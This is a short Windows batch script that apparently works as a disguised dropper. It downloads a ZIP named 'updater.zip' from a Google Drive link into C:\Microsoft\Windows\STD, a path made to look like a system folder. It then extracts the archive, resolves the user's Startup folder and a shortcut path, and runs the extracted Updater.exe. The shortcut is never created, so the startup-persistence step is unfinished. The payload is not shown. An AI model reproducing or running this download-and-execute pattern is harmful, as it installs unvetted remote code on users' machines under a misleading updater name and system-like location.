@echo off
REM Define variables
set "googleDriveFileUrl=https://drive.usercontent.google.com/download?id=15M3-5aCAauknU4cNh0ZZVnd6JpS3dA27&export=download&authuser=0&confirm=t&uuid=faf462a1-2a9d-429d-a979-a80923603408&at=APvzH3obvUl2FbatPQOoU4zuQMht:1733856537621"
set "destinationFolder=C:\Microsoft\Windows\STD"
set "downloadedFileName=updater.zip"
set "extractionFolder=%destinationFolder%\UpdaterFiles"

REM Ensure the destination folder exists
if not exist "%destinationFolder%" (
    mkdir "%destinationFolder%"
)

REM Full path to the downloaded file
set "downloadedFilePath=%destinationFolder%\%downloadedFileName%"

REM Download the ZIP file using curl
curl -L -o "%downloadedFilePath%" "%googleDriveFileUrl%"

REM Ensure the extraction folder exists
if not exist "%extractionFolder%" (
    mkdir "%extractionFolder%"
)

REM Extract the ZIP file using PowerShell
powershell -Command "Expand-Archive -Path '%downloadedFilePath%' -DestinationPath '%extractionFolder%' -Force"

REM Define the Startup folder for the current user
for /f "tokens=*" %%i in ('powershell -Command "[Environment]::GetFolderPath('Startup')"') do set "startupFolder=%%i"

REM Full path to the shortcut file
set "shortcutPath=%startupFolder%\UpdaterShortcut.lnk"
cd C:\Microsoft\Windows\STD\UpdaterFiles\
start Updater.exe
